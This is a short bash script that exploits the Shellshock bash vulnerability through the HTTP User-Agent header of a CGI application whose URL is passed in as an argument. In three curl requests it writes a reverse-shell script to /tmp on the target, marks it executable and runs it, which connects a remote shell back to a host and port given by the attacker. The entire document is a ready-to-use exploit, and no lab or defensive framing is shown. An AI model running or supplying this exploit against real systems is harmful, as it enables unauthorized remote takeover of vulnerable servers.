#!/bin/bash
APP_URL="$1"
REVERS_HOST="$2"
REVERS_PORT="$3"


curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; echo \"bash -i >& /dev/tcp/${REVERS_HOST}/${REVERS_PORT} 0>&1\" > /tmp/revers.sh" ${APP_URL}

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/chmod +x /tmp/revers.sh" ${APP_URL}

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /tmp/revers.sh" ${APP_URL}


